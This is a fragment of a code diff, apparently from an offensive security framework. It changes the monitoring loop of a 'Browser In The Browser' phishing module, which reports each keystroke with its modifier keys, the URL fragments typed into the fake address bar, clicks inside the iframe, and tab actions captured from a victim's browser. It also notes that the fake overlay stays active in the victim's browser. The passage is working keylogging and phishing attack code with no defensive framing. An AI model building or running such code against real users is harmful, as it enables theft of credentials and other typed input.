+                            print_success(f"[BITB] URL: {event_data.get('url', '')}")
+                        elif event_type == "url_typing":
+                            print_debug(f"[BITB] Omnibox: ...{event_data.get('fragment', '')}")
+                        elif event_type == "keystrokes":
+                            for key_data in event_data.get("keystrokes", []):
+                                where = key_data.get("where", "")
+                                prefix = f"[{where}] " if where else ""
+                                key = key_data.get("key", "")
+                                if key == "Enter":
+                                    print_info(f"[BITB] {prefix}<Enter>")
+                                elif key == " ":
+                                    print_info(f"[BITB] {prefix}<Space>")
+                                elif len(key) == 1:
+                                    mods = []
+                                    if key_data.get("shiftKey"):
+                                        mods.append("Shift")
+                                    if key_data.get("ctrlKey"):
+                                        mods.append("Ctrl")
+                                    if key_data.get("altKey"):
+                                        mods.append("Alt")
+                                    if key_data.get("metaKey"):
+                                        mods.append("Meta")
+                                    mod = "+".join(mods) + "+" if mods else ""
+                                    print_info(f"[BITB] {prefix}{mod}{key}")
+                                else:
+                                    print_info(f"[BITB] {prefix}<{key}>")
+                        elif event_type == "iframe_click":
+                            click = event_data.get("click", {})
+                            print_info(
+                                f"[BITB] [CLICK] {click.get('target', '?')} @ {click.get('url', '?')}"
+                            )
+                        elif event_type.endswith("_clicked") or event_type == "tab_clicked":
+                            print_info(f"[BITB] [ACTION] {event_type}")
+
+                    last_response_count = response_count
+
+                time.sleep(0.5)
         except KeyboardInterrupt:
             print_status("Stopping Browser In The Browser monitoring...")
-        except Exception as e:
-            print_error(f"Error in monitoring loop: {e}")
-            import traceback
-            print_debug(traceback.format_exc())
-            # Don't re-raise, just log the error and continue
-            pass
-        
-        print_status("[*] Monitoring stopped. The fake browser interface remains active in the victim's browser.")
+
+        print_status("[*] Monitoring stopped. Overlay remains until window.__ksBitb.stop().")
